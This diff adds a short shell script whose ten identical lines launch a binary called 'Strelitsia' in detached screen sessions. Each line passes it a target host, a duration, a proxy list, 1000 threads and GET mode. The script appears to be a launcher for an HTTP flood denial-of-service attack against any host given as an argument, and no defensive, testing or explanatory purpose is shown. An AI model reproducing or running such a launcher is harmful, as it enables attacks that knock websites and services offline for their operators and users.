@@ -1,0 +1,10 @@
+screen -dmS Strelitsia ./Strelitsia version=2 host=$1 limit=200 time=$2 list=proxy.txt threads=1000 mode=GET $1
+screen -dmS Strelitsia ./Strelitsia version=2 host=$1 limit=200 time=$2 list=proxy.txt threads=1000 mode=GET $1
+screen -dmS Strelitsia ./Strelitsia version=2 host=$1 limit=200 time=$2 list=proxy.txt threads=1000 mode=GET $1
+screen -dmS Strelitsia ./Strelitsia version=2 host=$1 limit=200 time=$2 list=proxy.txt threads=1000 mode=GET $1
+screen -dmS Strelitsia ./Strelitsia version=2 host=$1 limit=200 time=$2 list=proxy.txt threads=1000 mode=GET $1
+screen -dmS Strelitsia ./Strelitsia version=2 host=$1 limit=200 time=$2 list=proxy.txt threads=1000 mode=GET $1
+screen -dmS Strelitsia ./Strelitsia version=2 host=$1 limit=200 time=$2 list=proxy.txt threads=1000 mode=GET $1
+screen -dmS Strelitsia ./Strelitsia version=2 host=$1 limit=200 time=$2 list=proxy.txt threads=1000 mode=GET $1
+screen -dmS Strelitsia ./Strelitsia version=2 host=$1 limit=200 time=$2 list=proxy.txt threads=1000 mode=GET $1
+screen -dmS Strelitsia ./Strelitsia version=2 host=$1 limit=200 time=$2 list=proxy.txt threads=1000 mode=GET $1
